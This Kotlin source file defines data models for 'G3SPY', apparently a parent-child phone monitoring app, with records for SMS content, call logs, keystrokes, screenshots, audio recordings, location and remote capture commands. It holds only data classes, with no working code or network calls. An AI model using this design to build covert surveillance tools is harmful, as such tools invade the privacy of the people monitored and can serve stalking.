package com.g3spy.parent.model

/**
 * Data models for the G3SPY monitoring system
 * These classes represent the data structure shared between child and parent apps
 */

// Location data from the child device
data class LocationData(
    val id: String = "",
    val latitude: Double = 0.0,
    val longitude: Double = 0.0,
    val accuracy: Float = 0.0f,
    val altitude: Double = 0.0,
    val timestamp: Long = 0L,
    // Added for geofencing feature
    val isInsideGeofence: Boolean = true
)

// SMS message data from the child device
data class SmsData(
    val id: String = "",
    val sender: String = "",
    val recipient: String = "",
    val content: String = "",
    val timestamp: Long = 0L,
    val isIncoming: Boolean = true
)

// Call log data from the child device
data class CallData(
    val id: String = "",
    val phoneNumber: String = "",
    val contactName: String? = null,
    val timestamp: Long = 0L,
    val duration: Int = 0,
    val callType: String = "UNKNOWN" // INCOMING, OUTGOING, MISSED, REJECTED
)

// Keylog data from the child device
data class KeylogData(
    val id: String = "",
    val text: String = "",
    val app: String = "",
    val timestamp: Long = 0L
)

// Screenshot data from the child device
data class ScreenshotData(
    val id: String = "",
    val imageUrl: String = "",
    val timestamp: Long = 0L,
    val appInForeground: String = ""
)

// Audio recording data from the child device
data class AudioRecordingData(
    val id: String = "",
    val audioUrl: String = "",
    val timestamp: Long = 0L,
    val duration: Int = 0 // in seconds
)

// Remote command to send to the child device
data class RemoteCommand(
    val id: String = "",
    val command: String = "", // SCREENSHOT, AUDIO_RECORD, LOCATION_UPDATE, etc.
    val params: Map<String, Any> = mapOf(),
    val timestamp: Long = 0L,
    val isExecuted: Boolean = false
)

// Status update from the child device
data class DeviceStatus(
    val id: String = "",
    val batteryLevel: Int = 0,
    val isCharging: Boolean = false,
    val availableStorage: Long = 0L,
    val deviceModel: String = "",
    val androidVersion: String = "",
    val lastConnectionTime: Long = 0L,
    val isNetworkAvailable: Boolean = true,
    val activeApp: String = ""
)